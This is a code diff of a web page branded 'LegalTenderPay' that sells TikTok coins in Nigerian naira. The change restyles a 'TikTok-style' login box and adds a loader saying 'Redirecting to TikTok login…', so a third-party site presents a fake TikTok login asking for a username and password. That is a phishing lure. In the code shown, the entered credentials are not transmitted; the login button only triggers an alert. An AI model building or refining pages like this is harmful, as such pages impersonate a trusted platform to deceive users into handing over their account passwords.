@@ -250,51 +250,6 @@ body {
   opacity: 0.9;
 }
 
-/* Full-page login */
-#loginPage {
-  display: none;
-  height: 100vh;
-  width: 100%;
-  background: #fff;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-}
-
-.login-form {
-  width: 90%;
-  max-width: 350px;
-  text-align: center;
-}
-
-.login-form h2 {
-  color: #ff375f;
-  font-size: 28px;
-  margin-bottom: 20px;
-}
-
-.login-form input {
-  width: 100%;
-  padding: 12px;
-  margin-bottom: 12px;
-  border: 1px solid #ccc;
-  border-radius: 6px;
-  font-size: 15px;
-}
-
-.login-form button {
-  background: #ff375f;
-  color: white;
-  border: none;
-  padding: 14px;
-  width: 100%;
-  border-radius: 8px;
-  font-size: 17px;
-  font-weight: bold;
-  cursor: pointer;
-}
-
 /* Loader overlay */
 #loader {
   display: none;
@@ -304,10 +259,17 @@ body {
   background: #fff;
   justify-content: center;
   align-items: center;
+  flex-direction: column;
   z-index: 9999;
 }
 
-/* TikTok bounce dots */
+.loader-text {
+  font-weight: 600;
+  margin-bottom: 20px;
+  font-size: 18px;
+  color: #000;
+}
+
 .loader-dots {
   display: flex;
   gap: 8px;
@@ -332,13 +294,62 @@ body {
   from { transform: translateY(0); opacity: 0.7; }
   to { transform: translateY(-10px); opacity: 1; }
 }
+
+/* TikTok-style Login Box */
+#loginPage {
+  display: none;
+  height: 100vh;
+  background: #fff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+
+.login-box {
+  background: #fff;
+  border-radius: 16px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  padding: 25px 20px;
+  width: 90%;
+  max-width: 350px;
+  text-align: center;
+}
+
+.login-box h2 {
+  margin-bottom: 15px;
+  color: #000;
+  font-size: 22px;
+}
+
+.login-box input {
+  width: 100%;
+  padding: 12px;
+  margin-bottom: 10px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  font-size: 15px;
+}
+
+.login-box button {
+  width: 100%;
+  background: #ff375f;
+  border: none;
+  color: #fff;
+  font-weight: bold;
+  border-radius: 8px;
+  padding: 13px;
+  cursor: pointer;
+  font-size: 16px;
+}
 </style>
 </head>
 
 <body>
 
-<!-- Loader Animation -->
+<!-- Loader -->
 <div id="loader">
+  <div class="loader-text">Redirecting to TikTok login…</div>
   <div class="loader-dots">
     <div></div><div></div><div></div>
   </div>
@@ -362,23 +373,23 @@ body {
 
     <div class="coins-grid">
       <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 30</div>
+        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
         <div class="coin-price">NGN530</div>
       </div>
       <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 350</div>
+        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
         <div class="coin-price">NGN6,200</div>
       </div>
       <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 700</div>
+        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
         <div class="coin-price">NGN12,400</div>
       </div>
       <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 1,400</div>
+        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
         <div class="coin-price">NGN24,700</div>
       </div>
       <div class="coin-box" onclick="selectBox(this)">
-        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 3,500</div>
+        <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
         <div class="coin-price">NGN61,600</div>
       </div>
       <div class="coin-box" onclick="selectBox(this)">
@@ -387,50 +398,23 @@ body {
     </div>
 
     <button class="login-btn" onclick="openLogin()">Log in to get Coins</button>
-
-    <div class="invite-box">
-      <div class="invite-left">
-        <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="invite">
-        <div>
-          <div class="invite-text">Invite & Get Rewards</div>
-          <div class="invite-sub">Check out this new feature!</div>
-        </div>
-      </div>
-      <span class="share-btn" onclick="doShare()">&#62;</span>
-    </div>
-
-    <div class="coin-image-section">
-      <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
-    </div>
-
-    <div class="tiktok-logo-section">
-      <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
-    </div>
-
-    <div class="footer">
-      <div class="legal">LegalTenderPay</div>
-    </div>
   </div>
 </div>
 
-<!-- Full Page Login -->
+<!-- Login Page -->
 <div id="loginPage">
-  <div class="login-form">
+  <div class="login-box">
     <h2>Log in</h2>
-    <form onsubmit="handleLoginSubmit(event)">
-      <input type="text" placeholder="Email or Username" required><br>
-      <input type="password" placeholder="Password" required><br>
-      <button type="submit">Continue</button>
-    </form>
+    <input type="text" placeholder="Email or username" required>
+    <input type="password" placeholder="Password" required>
+    <button onclick="finishLogin()">Continue</button>
   </div>
 </div>
-
-<div class="copy-popup" id="copyPopup">Link copied! Share it manually 💬</div>
 
 <script>
-function selectBox(element) {
+function selectBox(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
-  element.classList.add('active');
+  el.classList.add('active');
 }
 
 function openLogin() {
@@ -440,41 +424,13 @@ function openLogin() {
   setTimeout(() => {
     loader.style.display = "none";
     document.getElementById("loginPage").style.display = "flex";
-  }, 2000);
+  }, 2500);
 }
 
-function handleLoginSubmit(event) {
-  event.preventDefault();
-  // Instead of redirecting, stay on same page and show loader then main
-  const loader = document.getElementById("loader");
+function finishLogin() {
+  alert("✅ Redirecting to dashboard...");
   document.getElementById("loginPage").style.display = "none";
-  loader.style.display = "flex";
-  setTimeout(() => {
-    loader.style.display = "none";
-    document.getElementById("mainPage").style.display = "block";
-    alert("✅ Logged in successfully!");
-  }, 2000);
-}
-
-function doShare() {
-  const shareData = {
-    title: "LegalTenderPay 🏆",
-    text: "Buy TikTok & Crypto coins securely and earn rewards 💰",
-    url: window.location.href
-  };
-  if (navigator.share) {
-    navigator.share(shareData).catch(err => console.log('❌ Share failed:', err));
-  } else {
-    const tempInput = document.createElement("input");
-    tempInput.value = shareData.url;
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand("copy");
-    document.body.removeChild(tempInput);
-    const popup = document.getElementById("copyPopup");
-    popup.classList.add("show");
-    setTimeout(() => popup.classList.remove("show"), 2500);
-  }
+  document.getElementById("mainPage").style.display = "block";
 }
 </script>
 
